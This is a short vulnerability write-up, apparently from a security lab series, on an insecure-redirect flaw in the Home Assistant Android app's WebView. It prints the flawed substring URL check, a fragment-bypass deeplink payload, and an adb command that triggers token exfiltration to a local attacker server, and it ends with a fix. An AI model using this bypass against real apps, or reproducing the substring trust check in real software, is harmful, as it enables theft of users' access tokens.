# 2.2.2 — Insecure Redirect Handling

## Vulnerability
The `isTrustedUrl()` method validates the initial URL, but the app does not re-validate URLs after HTTP redirects (302/301). An attacker can use a trusted-looking URL that passes `isTrustedUrl`, which then redirects to a malicious page. The `shouldOverrideUrlLoading` callback does not block untrusted redirect targets.

## Attack Flow
1. Deeplink: `homeassistant://webview?url=http://host:8000/oauth/callback%23home-assistant.io`
2. `isTrustedUrl` passes because URL contains "home-assistant.io" (fragment bypass)
3. `registerExternalAppV1()` is called — ExternalApp bridge activated
4. Server at `/oauth/callback` returns `302 Location: /exp/2.2.2.html`
5. WebView follows redirect without re-validating the destination URL
6. Attacker page loads with ExternalApp bridge → token theft

## Affected Code
```kotlin
// WebViewActivity.kt
private fun isTrustedUrl(url: String): Boolean {
    return url.contains("home-assistant.io")  // Substring bypass
}

private fun handleDeeplinkIntent(intent: Intent) {
    // Only validates initial URL, not redirect targets
    if (isTrustedUrl(urlParam)) {
        registerExternalAppV1()  // Bridge enabled for trusted context
        webView.loadUrl(urlParam)
    }
}
// No redirect URL validation in shouldOverrideUrlLoading
```

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
   ```
   adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/oauth/callback%23home-assistant.io"
   ```
3. Check `received/` for exfiltrated data

## Fixed Version
In the fix, `shouldOverrideUrlLoading` should validate redirect target URLs against the same `isTrustedUrl` check and block untrusted destinations.
